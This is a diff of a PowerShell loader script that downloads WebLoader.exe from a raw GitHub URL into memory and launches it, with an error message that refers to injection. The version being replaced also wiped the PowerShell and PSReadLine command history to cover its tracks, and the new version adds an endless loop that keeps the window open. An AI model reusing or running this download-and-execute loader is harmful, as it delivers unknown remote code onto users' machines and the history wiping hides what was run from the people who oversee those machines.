@@ -1,5 +1,5 @@
 # ===============================================
-# Run GUI EXE from URL + Force Keep Window Open + Clear History
+# Run GUI EXE from URL + Force Keep Window Open
 # ===============================================
 
 $Url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
@@ -14,6 +14,7 @@ try {
     Write-Host "[+] Downloaded $($PEBytes.Length) bytes" -ForegroundColor Green
 } catch {
     Write-Host "[-] Download failed!" -ForegroundColor Red
+    pause
     exit
 }
 
@@ -34,22 +35,17 @@ try {
     }
     
     Write-Host "[+] GUI Program Launched Successfully!" -ForegroundColor Green
-    Write-Host "`nThe program should be running now." -ForegroundColor Yellow
-    Write-Host "Do NOT close this window manually." -ForegroundColor Cyan
-
-    # === Force Keep PowerShell Alive ===
-    Write-Host "`nKeeping this window open (Press Ctrl+C to force close)..." -ForegroundColor Magenta
+    Write-Host "`nProgram should be running now." -ForegroundColor Yellow
     
-    while ($true) {
-        Start-Sleep -Seconds 10
-    }
-
 } catch {
-    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
-    Start-Sleep -Seconds 10
+    Write-Host "[-] Injection Error: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# Clear History (if it reaches here)
-Clear-History -ErrorAction SilentlyContinue
-if (Get-PSReadlineOption) { Clear-Content -Path (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue }
-Remove-Item -Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+# ================== FORCE KEEP WINDOW OPEN ==================
+Write-Host "`n=== This window will stay open ===" -ForegroundColor Magenta
+Write-Host "Close this window manually when you are done." -ForegroundColor Cyan
+
+# Infinite loop to prevent auto close
+while ($true) {
+    Start-Sleep -Seconds 5
+}
